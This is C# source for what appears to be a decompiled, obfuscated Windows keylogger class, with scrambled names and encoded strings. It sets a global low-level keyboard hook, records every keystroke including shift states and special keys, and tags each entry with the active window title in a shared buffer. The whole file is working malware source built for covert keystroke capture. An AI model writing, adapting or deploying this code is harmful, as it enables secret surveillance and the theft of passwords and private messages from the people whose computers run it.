using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

public class GMHJCMFV
{
	private delegate int Delegate0(int Code, int wParam, ref KHNENYOW lParam);

	public struct KHNENYOW
	{
		public int QLRCTRME;

		public int GITCNTUI;

		public int YURWWKDX;

		public int URKBFENK;

		public int DHQVMFWJ;
	}

	private string string_0;

	private static IntPtr intptr_0 = (IntPtr)0;

	private static string string_1 = "";

	private static Delegate0 delegate0_0 = null;

	public GMHJCMFV(string output)
	{
		try
		{
			string_0 = output;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string JLXDQJDF(IntPtr hWnd)
	{
		string result = default(string);
		try
		{
			if (hWnd.ToInt32() <= 0)
			{
				result = null;
				return result;
			}
			int windowTextLength = GetWindowTextLength(hWnd);
			if (windowTextLength == 0)
			{
				result = null;
				return result;
			}
			StringBuilder stringBuilder = new StringBuilder(checked(windowTextLength + 1));
			GetWindowTextA((int)hWnd, stringBuilder, stringBuilder.Capacity);
			result = stringBuilder.ToString().Trim();
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool CLYOMYGK()
	{
		bool result = default(bool);
		try
		{
			result = intptr_0 != (IntPtr)0;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void PTXIOCQK()
	{
		try
		{
			delegate0_0 = KYBRDLCK;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			intptr_0 = (IntPtr)SetWindowsHookExA(13, delegate0_0, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void CWDQWGX()
	{
		try
		{
			if (CLYOMYGK() && UnhookWindowsHookEx((int)intptr_0) != 0)
			{
				intptr_0 = (IntPtr)0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int int_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int int_0, Delegate0 delegate0_1, int int_1, int int_2);

	public static int KYBRDLCK(int Code, int int_0, ref KHNENYOW khnenyow_0)
	{
		try
		{
			string text = JLXDQJDF(GetForegroundWindow());
			if (Operators.CompareString(text, string_1, false) != 0)
			{
				string_1 = text;
				IEBNQOUC.HHFJBSV = IEBNQOUC.HHFJBSV + Environment.NewLine + HRKUSLC.KJSIUEP("hXOKhHZXcn2EdldyfYR2V3J9hHZXcn2EdldyfYR2V3J9Hw==", "False") + text + HRKUSLC.KJSIUEP("aoWQl4lqhZCXiWqFkJeJaoWQl4lqhZCXiWqFkJeJd4bADA==", "False") + Environment.NewLine + Environment.NewLine;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		int result = default(int);
		try
		{
			string text2 = "";
			if (int_0 == 256 || int_0 == 260)
			{
				checked
				{
					switch (khnenyow_0.QLRCTRME)
					{
					case 8:
						IEBNQOUC.HHFJBSV = IEBNQOUC.HHFJBSV.Substring(0, IEBNQOUC.HHFJBSV.Length - 1);
						break;
					case 9:
						text2 = char.ConvertFromUtf32(9);
						break;
					case 13:
						text2 = Environment.NewLine;
						break;
					case 20:
						text2 = ((!Control.IsKeyLocked((Keys)20)) ? HRKUSLC.KJSIUEP("Q5mMkZJ2XpWfhW5emJ6fQyQ=", "False") : HRKUSLC.KJSIUEP("QpiLkJF1XZSehG1dl5WHf10m", "False"));
						break;
					case 27:
						text2 = HRKUSLC.KJSIUEP("S6GWy62IZh0=", "False");
						break;
					case 32:
						text2 = HRKUSLC.KJSIUEP("RyA=", "False");
						break;
					case 35:
						text2 = HRKUSLC.KJSIUEP("R52SwqqEYiE=", "False");
						break;
					case 36:
						text2 = HRKUSLC.KJSIUEP("WrCo1safsoAP", "False");
						break;
					case 37:
						text2 = HRKUSLC.KJSIUEP("U6mVvXIT", "False");
						break;
					case 38:
						text2 = HRKUSLC.KJSIUEP("SJ6ssmce", "False");
						break;
					case 39:
						text2 = HRKUSLC.KJSIUEP("X7WjyX4H", "False");
						break;
					case 40:
						text2 = HRKUSLC.KJSIUEP("O5GXpVor", "False");
						break;
					case 46:
						text2 = HRKUSLC.KJSIUEP("WrCkzMWXdQ4=", "False");
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						if (((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown())
						{
							string text3 = HRKUSLC.KJSIUEP("YnynjoNhgIeTgJ98jY6KYYSHlwk=", "False");
							string[] array = text3.Split(new char[1] { Conversions.ToChar(HRKUSLC.KJSIUEP("VBM=", "False")) });
							switch (khnenyow_0.QLRCTRME)
							{
							case 48:
								text2 = array[9];
								break;
							case 49:
								text2 = array[0];
								break;
							case 50:
								text2 = array[1];
								break;
							case 51:
								text2 = array[2];
								break;
							case 52:
								text2 = array[3];
								break;
							case 53:
								text2 = array[4];
								break;
							case 54:
								text2 = array[5];
								break;
							case 55:
								text2 = array[6];
								break;
							case 56:
								text2 = array[7];
								break;
							case 57:
								text2 = array[8];
								break;
							}
						}
						else
						{
							text2 = char.ConvertFromUtf32(khnenyow_0.QLRCTRME);
						}
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? char.ConvertFromUtf32(khnenyow_0.QLRCTRME + 32).ToLower() : char.ConvertFromUtf32(khnenyow_0.QLRCTRME + 32).ToUpper());
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = HRKUSLC.KJSIUEP("UaedGA==", "False") + Conversions.ToString(khnenyow_0.QLRCTRME - 111) + HRKUSLC.KJSIUEP("o4EC", "False");
						break;
					case 162:
					case 163:
						text2 = HRKUSLC.KJSIUEP("Vaue0cKpwsrOsVUS", "False");
						break;
					case 164:
					case 165:
						text2 = HRKUSLC.KJSIUEP("RJqLvbeBXyQ=", "False");
						break;
					case 186:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("cBI=", "False") : HRKUSLC.KJSIUEP("axY=", "False"));
						break;
					case 187:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("WSs=", "False") : HRKUSLC.KJSIUEP("bAY=", "False"));
						break;
					case 188:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("YhE=", "False") : HRKUSLC.KJSIUEP("XCc=", "False"));
						break;
					case 189:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("cAQ=", "False") : HRKUSLC.KJSIUEP("eC4=", "False"));
						break;
					case 190:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("ZRA=", "False") : HRKUSLC.KJSIUEP("bRg=", "False"));
						break;
					case 191:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("aQ0=", "False") : HRKUSLC.KJSIUEP("gQU=", "False"));
						break;
					case 192:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("lBM=", "False") : HRKUSLC.KJSIUEP("vQg=", "False"));
						break;
					default:
						text2 = char.ConvertFromUtf32(khnenyow_0.QLRCTRME);
						break;
					case 219:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("mgg=", "False") : HRKUSLC.KJSIUEP("wAI=", "False"));
						break;
					case 220:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("czA=", "False") : HRKUSLC.KJSIUEP("vwQ=", "False"));
						break;
					case 221:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("gSM=", "False") : HRKUSLC.KJSIUEP("rBg=", "False"));
						break;
					case 222:
						text2 = ((!((Computer)Class2.Class1_0).get_Keyboard().get_ShiftKeyDown()) ? HRKUSLC.KJSIUEP("bQE=", "False") : HRKUSLC.KJSIUEP("Ths=", "False"));
						break;
					}
					IEBNQOUC.HHFJBSV += text2;
					IEBNQOUC.LWHRWHJ = IEBNQOUC.HHFJBSV;
					return result;
				}
			}
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int GetWindowTextLength(IntPtr hwnd);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA(int hwnd, StringBuilder lpString, int cch);
}
